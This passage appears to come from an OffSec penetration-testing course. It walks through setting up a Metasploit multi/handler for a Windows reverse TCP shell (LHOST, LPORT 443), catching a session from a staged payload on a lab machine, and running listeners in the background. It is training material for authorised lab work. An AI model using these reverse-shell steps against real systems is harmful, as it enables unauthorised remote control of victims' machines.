# OffSec

Payload options (windows/shell/reverse_tcp):

| Name | Current Setting | Required | Description |
|---|---|---|---|
| EXITFUNC | process | yes | Exit technique (Accepted: '', seh, thread, process, none) |
| LHOST | (specified) | yes | The listener address (an interface may be) |
| LPORT | 4444 | yes | The listener port |

```
msf6 exploit(multi/handler) > set LHOST 192.168.119.2
LHOST => 192.168.119.2
msf6 exploit(multi/handler) > set LPORT 443
```

```
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.119.2:443
Listing 666 - Set payload and options for multi/handler and launch it
```

Once our listener is running on port 443, we can start staged.exe again on BRUTE. Our Metasploit multi/handler receives the incoming staged payload and provides us with an interactive reverse shell in the context of a session.

```

[*] Command shell session 6 opened (192.168.119.2:443 -> 192.168.50.202:50838)
2022-08-01 10:18:13 -0400
```

The staged reverse shell and Metasploit started a session for us to use. For staged and other advanced payload types (such as Meterpreter), we must use multi/handler instead of using Netcat in order for the payload to work.

Using run without arguments will block the command prompt until execution or we background the session. As we've learned, we can use run -j to start the listener in the background, allowing us to continue other work while we wait for the connection. We can use the jobs to get a list of all currently active jobs, as active listeners waiting for connections.

Let's exit our session and restart the listener with run -j. Then, we'll list the currently active jobs jobs. Once we execute staged.exe again, Metasploit notifies us that a new session was created.
